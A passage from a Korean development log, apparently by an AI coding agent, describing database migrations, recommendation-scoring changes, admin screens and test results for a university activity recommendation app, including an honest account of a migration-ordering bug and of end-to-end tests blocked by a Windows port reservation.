- **전공 목록 재확인:** 등록 전에 공식 페이지(https://www.smu.ac.kr/kor/edu/seoul01.do)를 다시 확인했다(WebFetch). 원 가이드라인 8.1의 35개 목록(인문콘텐츠학부 4개, 공간환경학부·행정학부·가족복지학과·국가안보학과, 사범대학 4개, 경영경제대학 4개, 지능·데이터융합학부 4개, SW융합학부 5개, 생명화학공학부 4개, 의류학과, 스포츠무용학부 2개, 미술학부 2개, 음악학부)과 **정확히 일치**했고 자유전공학부대학 존재도 이미 문서에 반영돼 있었다 — 임의 수정 없이 그대로 등록했다.
- **마이그레이션 (`20261013010000_service_fields_and_majors.sql`):**
  - `interests`에 `code`(unique, not null)·`sort_order`·`is_active`를 추가하고, 12개 서비스 분야를 **이 마이그레이션이 고정 UUID로 직접 등록**한다(기존 데모 6개는 같은 id를 재사용해 표시명만 교체, 나머지 6개는 새 id). 처음에는 "기존 데모 행을 이름으로 찾아 UPDATE하고, 새 6개만 INSERT" 방식으로 작성했으나, **마이그레이션이 seed.sql보다 먼저 실행된다는 사실**을 놓쳐 신선한 `db reset`에서는 UPDATE 대상이 없어 6개 행이 비어 있는 상태가 됐고, 그 상태에서 `major_field_weights`가 그 6개를 참조하는 모든 행이 FK/조인 실패로 조용히 누락되는 문제를 실제로 겪었다(아래 "실제 겪은 문제" 참조) — 12개를 전부 이 마이그레이션에서 직접 만들도록 고쳐 해결했다.
  - `majors`에 `code`(unique)·`campus`(기본 `SMU_SEOUL`)·`is_active`·`sort_order`·`source_url`·`verified_at`을 추가하고, 서울캠퍼스 공식 35개 전공을 등록했다(`source_url`에 확인 페이지, `verified_at`에 2026-10-13). 기존 데모 전공 5개는 `is_active=false`로 비활성화하되 지우지 않았다(이미 배정된 데모 프로필 참조 보존).
  - `major_field_weights`(major_id, interest_id, weight∈{1.0,0.5}, mapping_version='v1') 신설 + RLS(공개 읽기, 운영자 쓰기). 원 가이드라인 8.3의 24개 연결 행을 35개 전공 전체로 풀어 104개 행을 등록했다. **리터럴 UUID로 직접 INSERT한다** — 처음에 `INSERT ... SELECT ... FROM (VALUES ...) AS w JOIN majors JOIN interests` 형태의 조인 기반 대량 삽입을 시도했으나 (원인 불명, 위 "실제 겪은 문제" 참조) 일부 행이 조용히 누락되는 현상이 있어, 사후 검증(마이그레이션 끝에 "모든 활성 전공이 1.0 연결을 최소 1개 갖는가"를 직접 체크하고 안 맞으면 `raise exception`하는 `do $$ ... $$` 블록)으로 확인하면서 가장 단순하고 이 코드베이스 전체에서 이미 안정적으로 쓰이는 패턴(명시적 리터럴 다중 행 `INSERT`)으로 바꿔 해결했다.
  - `profile_majors`에 `kind`(primary/double/minor, 기본 primary)·`use_for_recommendation`(기본 true)·`weight` 추가 + 사용자당 주전공 최대 1개 부분 유니크 인덱스(`profile_majors_one_primary_per_profile`).
  - `profiles`에 `major_status`(assigned/exploring/unlisted/not_provided, 기본 not_provided)·`recommendation_mode`(balanced/major_focus/interest_expand, 기본 balanced) 추가.
  - `activities`에 `weekly_hours` 추가(eligibility 관련 필드 3개는 G2에서).
- **시드 재작성 (`supabase/seed.sql`):** 활동 생성 시 순환하는 분야 카테고리 6개를 새 표시명으로 교체(활동 제목·태그가 자동으로 새 분야 이름을 쓰게 됨 — `recommend.ts`의 관심분야 매칭은 태그 문자열과 interests.name의 완전 일치 비교라 이름이 바뀌면 반드시 함께 바꿔야 한다). 기존 데모 전공 insert에 `is_active=false`를 명시하고, 데모 학생 4명의 `profiles.major_status`를 `assigned`로 갱신했다(이미 전공이 배정돼 있던 상태와 일치시킴). 12개 interests는 마이그레이션이 직접 만들므로 seed.sql에서는 더 이상 넣지 않는다(중복 제거).
- **온보딩/프로필 수정 화면 (`src/app/onboarding/actions.ts`, `ProfileWizard.tsx`):**
  - "소속" 단계에 전공 상태(4가지) 버튼, 단과대학 필터(select) + 전공 다중 선택, 선택한 전공마다 주전공(라디오, 하나만)·복수전공/부전공(select)·"추천에 반영"(체크박스)을 보여주는 패널을 추가했다. 저장 전에 주전공이 2개 이상이면 서버 액션이 거부한다(DB 부분 유니크 인덱스와 같은 규칙을 앱 레벨에서도 먼저 확인).
  - "관심분야" 단계에 우선순위 토글 + 선택 순서를 그대로 우선순위로 쓰는 위/아래 이동 버튼을 추가했다(토글 끄면 전부 `priority=null`로 저장해 균등 반영).
  - "참여 조건" 단계에 추천 모드(균형/전공 중심/관심 확장) 라디오를 추가했다(no_major 모드는 사용자가 고르지 않고 G2의 `recommend.ts`가 전공 미반영 상태를 보고 대신 적용할 예정).
  - `loadReferenceData`는 `is_active=true`만, `sort_order`로 정렬해 내려준다. `loadCurrentProfileData`/`saveProfile`을 위 필드들에 맞게 확장했다.
- **검증:** `lint`/`typecheck` 통과. `supabase db reset`으로 마이그레이션+시드가 깨끗이 적용됨을 확인(마이그레이션 안의 자체 검증 `do` 블록도 통과). DB에 직접 질의해 interests 12개(전부 active), majors 35개(전부 active), major_field_weights 104행, **활성 전공 전원이 1.0 연결을 최소 1개 가짐**(0건 누락), profile_majors 기본값(kind=primary, use_for_recommendation=true), 활동 태그가 새 분야 이름으로 교체됨, `activities.weekly_hours` 컬럼 존재를 모두 직접 확인했다. `npm test` **299/299 통과**(기존 스위트 그대로 — G1은 기존 추천/매칭/파티 로직을 건드리지 않음). `npm run build` 성공. `npm run test:e2e`는 **이번 세션에서는 실행하지 못했다** — 이 Windows 환경에서 포트 3000이 Hyper-V/WSL의 동적 포트 제외 범위(`netsh interface ipv4 show excludedportrange protocol=tcp`에 2966-3065로 표시)에 걸려 있고, 이를 풀려면 관리자 권한으로 `winnat` 서비스를 재시작해야 하는데 이 세션은 관리자 권한이 없다(`net stop winnat` → "Access is denied"). Playwright의 `baseURL`을 임시로 다른 포트로 바꿔 시도했으나 Supabase 로컬 Auth의 매직링크 리디렉션이 `supabase/config.toml`의 site_url(포트 3000 고정)을 그대로 쓰기 때문에 로그인이 깨져, 포트를 바꾸지 않고 원래 설정으로 되돌렸다(실제 변경 없음, `git diff`로 확인). G1 자체는 로그인 플로우를 건드리지 않았으므로 코드 문제가 아니라 환경 문제로 판단한다 — 이 환경에서 E2E를 돌리려면 관리자 권한으로 포트 제외 범위를 정리하거나(`net stop winnat && net start winnat`) 다른 머신/WSL에서 실행해야 한다.
- **실제 겪은 문제 (디버깅 기록):** `major_field_weights`를 한 번의 `INSERT ... SELECT ... FROM (VALUES 105행) AS w JOIN majors JOIN interests` 문으로 넣으려 했을 때, 매번 다른 패턴으로 일부 행(처음엔 41/105, PL/pgSQL 함수+루프로 바꿔도 여전히 일부 누락)이 조용히 사라지는 현상을 봤다. 여러 단계로 좁혀본 결과 **진짜 원인은 단순했다** — 이 마이그레이션이 `interests`의 기존 데모 6개 행을 "이름으로 찾아 UPDATE"하는 방식으로 작성돼 있었는데, **마이그레이션은 `db reset`에서 `seed.sql`보다 먼저 실행되므로** 신선한 환경에서는 그 6개 행이 아직 존재하지 않아 UPDATE가 아무 일도 하지 않았고, 결과적으로 그 6개 분야 코드를 참조하는 모든 `major_field_weights` 행이 조인 실패로 사라진 것이었다(FK 위반 에러가 뜬 뒤에야 drill-down으로 발견). 교훈: **이 프로젝트의 마이그레이션/시드 실행 순서(마이그레이션 전체 → seed.sql)를 새 참조 데이터를 설계할 때 항상 전제해야 한다.** 디버깅 과정에서 만든 임시 디버그 테이블·PL/pgSQL 함수는 모두 제거하고 최종적으로는 리터럴 `INSERT ... VALUES`만 남겼다.
- **후속(다음 세션):** 사용자가 포트 3000 예약을 직접 풀고 로컬 Supabase를 재기동해, G1에서 실행하지 못했던 `npm run test:e2e`를 처음으로 돌렸다. `tests/e2e/auth-onboarding.spec.ts`가 G1의 새 화면(전공 상태·전공 선택·관심분야 우선순위·추천 모드)을 전부 "건너뛰기"로 지나쳐 실제로는 그 화면들을 검증하지 않고 있었음을 확인하고, 각 단계를 실제로 조작(전공 상태·전공 선택 → 주전공 자동 지정 확인, 관심분야 2개 선택 후 우선순위 토글+재정렬, 추천 모드 선택)한 뒤 `/me/edit`에서 그 값이 그대로 복원되는지까지 확인하도록 강화했다(커밋 `3c8d4bd`). 전체 E2E 9/9 통과 확인 후 G2로 진행했다.

## G2: 추천 개편과 자격 분리 (티처블 머신 연동, 완료)

`docs/teachable-machine-integration.md` 9장 G2 범위: 3.2(`activity_fields`, 관리자 수동 확정 UI 포함), 3.4(`eligibility_scope`/`eligible_major_ids`/`eligibility_verified_at` — `weekly_hours`는 G1에서 이미 추가), 3.7의 `recommendation_modes`, 4장 전체(추천 로직 재작성), `recommendations/query.ts`를 `activity_fields` 기반으로 교체. 완료 기준은 8장 체크리스트 4·5·11번 + 4장 필수 테스트.

- **마이그레이션 (`20261013030000_activity_fields_and_eligibility.sql`):**
  - `activity_fields`(activity_id, interest_id, role primary/secondary, source manual/teachable_machine/import, analysis_id, confirmed_by, confirmed_at) 신설. `(activity_id, interest_id)` 유니크 + `role='primary'` 부분 유니크 인덱스로 활동당 대표 분야 1개를 강제한다. `analysis_id`는 G3(`poster_analyses`)가 생기기 전까지 FK 없이 둔다. RLS는 `activities`/`activity_tags`와 같은 패턴(공개된 활동은 비회원도 조회, 쓰기는 운영자만) — 새 SECURITY DEFINER 함수 없이 직접 테이블 RLS로 처리해 `tests/rls/execute_privileges.test.ts` 허용 목록을 건드리지 않았다.
  - `activities`에 `eligibility_scope`(any/restricted/unknown, 기본 unknown), `eligible_major_ids`(uuid[], 기본 빈 배열), `eligibility_verified_at`을 추가하고, `restricted`인데 지정 전공이 비어 있으면 거부하는 CHECK 제약을 걸었다(배열 요소에는 FK를 걸 수 없어 애플리케이션이 전공 id 유효성을 확인한다).
  - `app_settings.recommendation_modes`(균형/전공 중심/관심 확장/전공 미배정 4모드, 각 6항목 가중치 합 1)를 추가하고, 기존 `recommendation_weights`는 지우지 않되 "더 이상 읽지 않음"으로 설명만 갱신했다.
- **추천 로직 전면 재작성 (`src/lib/recommend.ts`):** 기존 5항목(관심분야/선호 활동 유형/전공 키워드 매칭/지역·방식/항상 미상이던 duration)을 가이드 4장의 6항목(interest/major/activity_type/participation/time/goal — goal은 이번 범위 미구현으로 항상 미상)으로 교체했다.
  - `interest`는 더 이상 문자열 태그 비교가 아니라 `activity_fields`의 확정 분야와 관심분야 우선순위 가중치(합 1 정규화)의 겹침 합으로 계산한다.
  - `major`는 전공 키워드가 제목·태그에 포함되는지 보던 기존 방식을 버리고, `major_field_weights` 연결표의 전공별 최댓값 r(m,a)을 q(전공 간 비중, 기본 균등)로 가중 평균한다. 활동 분야가 미확정이면 중립값 0.5로 처리하고 전공 관련 근거 문장은 만들지 않는다(가이드 4장 "전공 항목의 특별 규칙").
  - `time`은 `activities.weekly_hours`와 `profiles.weekly_available_hours`를 실제로 비교해 초과 비율만큼 적합도를 깎는다(이전에는 비교 가능한 필드가 없어 항상 미상이었다).
  - 가중치는 고정 100점 척도 대신 **추천 모드별**(`RecommendationModesConfig`, 합 1)로 바뀌었다. `resolveRecommendationMode()`가 추천 반영 전공이 없거나 `major_status≠'assigned'`면 사용자가 고른 모드와 무관하게 `no_major`(전공 가중치 0)를 강제한다.
  - **지원 자격은 전공 관련성과 완전히 분리된 축이다.** `eligibility_scope='restricted'`이고 사용자의 추천 반영 전공이 `eligible_major_ids`에 없으면 `rankActivities`가 결과에서 완전히 제외한다(탐색 추천으로도 대체하지 않음 — 전공 연결표로는 지원 가능 여부를 판단하지 않는다). `unknown`은 제외하지 않고 `eligibility: "needs_check"`로 표시만 한다. 상세 화면(단건 스코어링)은 제외하지 않고 배지로 상태를 알려준다.
- **`src/lib/recommendations/query.ts` 전면 교체:** `loadRecommendationProfile`이 이제 `major_status`/`profile_majors(use_for_recommendation)`/`major_field_weights`/`profile_interests.priority`/`weekly_available_hours`/`recommendation_mode`를 모두 읽어 `RecommendationProfileInput`을 구성한다. 관심분야 우선순위 → 가중치 변환은 `computeInterestWeights()`(우선순위 미설정 시 균등, 설정 시 1순위가 n, 꼴찌가 1이 되는 선형 가중을 정규화 — 설계 문서가 구체적 변환식을 정하지 않아 "순위가 낮을수록 비중이 작아지기만 하면 된다"는 조건을 만족하는 구현 선택)로 분리해 단위 테스트 가능하게 했다. `loadActivityFieldsByActivity()`가 여러 활동의 `activity_fields`를 한 번에 묶어 불러온다. `loadRecommendationModes()`는 `app_settings.recommendation_modes`가 없으면 `DEFAULT_RECOMMENDATION_MODES`로 대체한다.
- **호출부 (`src/app/page.tsx`은 변경 없음, `src/app/activities/[id]/page.tsx` 수정):** `activity_tags` 대신 `loadActivityFieldsByActivity()`로 `activity_fields`를 불러와 추천 계산에 넘긴다(`activity_tags`는 여전히 "#태그" 자유 키워드로 화면에 표시). 상세 화면에 "분야" 섹션(대표·부가 칩, 없으면 "분야 미확정" 배지)과 "지원 자격 범위"(전공 무관/지정 전공만/확인 필요) 행을 추가했고, "추천 근거" 섹션은 `eligibility==="restricted_excluded"`면 전용 안내로 교체하고, `needs_check`/`fieldsUnconfirmed`일 때 각각 배지를 덧붙인다.
- **관리자 화면:**
  - `ActivityForm`에 "지원 자격 범위" select(전공 무관/지정 전공만/확인 필요)·"주당 예상 투입 시간" 입력·(지정 전공만일 때) 전공 복수 선택을 추가했다. `weekly_hours`는 G1에서 컬럼만 추가되고 어떤 화면에도 연결되지 않았던 것을 이번에 처음 연결했다. `eligibility_verified_at`은 별도 체크박스 없이 "scope를 any/restricted로 명시하는 것 자체가 원문을 확인한 것"으로 간주해 서버 액션이 자동으로 현재 시각을 채운다(unknown으로 되돌리면 비운다).
  - 새 `ActivityFieldsManager`(`src/app/admin/activities/[id]/edit/ActivityFieldsManager.tsx`, `MatchTemplatesManager`와 같은 패턴)로 대표 분야 1개(select) + 부가 분야(다중 토글)를 확정한다. `setActivityFieldsAction`(직접 테이블 쓰기, RLS가 운영자 전용이라 DB 함수 불필요)이 "전체 삭제 후 다시 삽입"으로 멱등하게 반영한다. 활동을 먼저 등록해야 쓸 수 있어(activity_id 필요) 수정 화면에만 둔다 — 생성 시점에 분야가 없어도 "목록·검색에는 그대로 나오고 '분야 미확정'으로 표시"하므로 문제 없다(가이드 3.2).
- **검증:**
  - 단위 테스트(`tests/unit/recommend.test.ts`, 완전히 재작성, 24건) — 가이드 8.5 "전기공학전공 94점" 예시를 두 방식으로 재현(① 가이드가 가정한 I/M/T/P/D/G 값을 균형 모드 가중치에 그대로 대입해 94점이 나오는 공식 자체를 확인, ② goal이 실제로는 항상 미상인 이번 구현에서 나머지 5항목만으로 정규화해도 점수가 왜곡되지 않음을 확인), 전공 미배정(no_major 모드), 복수전공 가중 평균(q 균등, 중복 가산 없음), 분야 미확정 활동(중립 0.5 + 근거 없음), 지정 전공 제한(포함/미포함/unknown/연결표로 판단하지 않음/rankActivities에서 완전 제외), 모드별 가중치 합 1, 시간 적합(이하/초과 감소), 비교 불가 항목 정규화. **가이드의 "94점" 수치는 T=0.8 같은 설명용 가정값(이진 매칭만 지원하는 실제 구현으로는 만들 수 없는 값)을 포함하므로, 공식 재현과 실제 계산 검증을 테스트 두 개로 분리했다** — 아래 "원 설계와의 차이" 참조.
  - RLS 테스트(`tests/rls/activity_fields_and_eligibility.test.ts`, 신규 11건) — 운영자만 분야 확정 가능(일반 사용자 직접 테이블 쓰기 거부), 활동당 대표 분야 1개 제약, `(activity_id, interest_id)` 중복 거부, 비공개 활동의 분야는 비로그인 사용자에게 숨겨지고 공개 전환 시 보임, `eligibility_scope='restricted'`인데 지정 전공이 비면 거부/있으면 성공, 기본값 unknown, 일반 사용자의 지원 자격 필드 수정 거부, `recommendation_modes` 가중치 합 1 + 수정 거부.
  - E2E(`tests/e2e/activity-fields-recommendation.spec.ts`, 신규) — 관리자가 새 "분야 확정" 화면에서 예비 모델의 4클래스 밖에 있는 분야("스포츠·운동·건강관리")를 대표 분야로 수동 확정 → 그 분야만 관심분야로 고른 신규 사용자의 활동 상세 화면에 실제로 추천 근거("선택한 '스포츠·운동·건강관리' 관심분야와 일치")가 나타나는지 end-to-end로 확인했다(체크리스트 11번 "예비 모델 밖 8개 분야도 수동 태그로 등록·추천된다"을 그대로 재현).
  - `npm test` **325/325 통과**, `npm run lint`/`npm run typecheck`/`npm run build` 모두 성공, `npm run test:e2e` **10/10 통과**(신규 1건 포함).
- **원 설계와의 차이 (11장에 추가할 사항):** 가이드 8.5의 94점 예시는 활동 유형 일치(T=0.8)·시간 적합(D=0.7) 모두 "설명용 가정"이라고 명시하지만, 이 구현은 activity_type을 이진(일치/불일치) 매칭만 지원해 T=0.8 같은 중간값을 실제로 만들 수 없다. `time`은 실제 `weekly_hours` 비교식으로 D=0.7을 재현할 수 있어 그대로 검증했지만, T는 공식 자체(균형 모드 가중치 적용 시 94점이 나옴)만 단위 테스트로 재현하고 실제 `scoreActivity` 호출로는 재현하지 않았다 — 의도적인 범위 선택이며, activity_type을 세분화할 필요가 생기면 별도 작업으로 확장한다.
